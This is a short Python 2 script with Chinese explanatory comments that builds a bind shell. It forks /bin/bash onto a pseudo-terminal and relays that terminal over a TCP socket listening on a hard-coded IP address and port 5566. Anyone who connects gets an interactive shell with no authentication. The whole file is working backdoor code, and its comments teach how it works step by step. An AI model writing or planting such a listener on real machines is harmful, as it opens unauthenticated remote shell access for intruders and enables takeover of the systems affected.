# -*- coding:utf-8 -*-

import pty
import tty
import select
import os
import time
import signal
from socket import *

ADDR=("14.152.57.47",5566)
CHILD=0

# 生成pty对
m,s = pty.openpty()
 
print os.ttyname(s)
 
def hup_handle(signum,frame):
    sock.send("\n")
    sock.close()
    raise SystemExit

# 新建子进程，fork()函数会返回两次，分别在父子进程中返回，子进程永远返回0，通过这个判断当前进程是否是子进程
pid = os.fork()

if pid == CHILD:
    #setsid()函数将子进程独立起来，进程成为新的会话组长和新的进程组长，并与原来的登录会话和进程组脱离
    os.setsid()
    os.close(m)
    #dup2()将s复制到标准输入输出和错误输出上
    os.dup2(s,0)
    os.dup2(s,1)
    os.dup2(s,2)

    # 以读写方式打开标准输出
    tmp_fd = os.open(os.ttyname(1),os.O_RDWR)
    os.close(tmp_fd)
    # execlp函数可以把当前进程替换为一个新进程，且新进程与原进程有相同的PID。
    os.execlp("/bin/bash","/bin/bash")
else:
    os.close(s)
    signal.signal(signal.SIGINT,hup_handle)
    sock = socket(AF_INET, SOCK_STREAM)
    sock.setsockopt(SOL_SOCKET,SO_REUSEADDR ,1)
    sock.bind(ADDR)
    sock.listen(1)
    conn, addr = sock.accept()
    conn.settimeout(3)
    fds = [m,conn]
    mode = tty.tcgetattr(0)
    #tty.setraw(0)
    try:
        while True:
            if not conn.connect_ex(addr):raise Exception
            r,w,e = select.select(fds,[],[])
            #监听到m说明bash有新的输入
            if m in r:
                data = os.read(m,1024)
                if data:
                    conn.send(data)
                else:
                    fds.remove(m)
            #监听到conn说明连接有消息
            if conn in r:
                data = conn.recv(1024)
                if data:
                    os.write(m,data)
                else:
                    fds.remove(conn)
                    conn.close()
                    sock.close()
    except:
        conn.close()
        sock.close()
        raise SystemExit
    os.close(m)
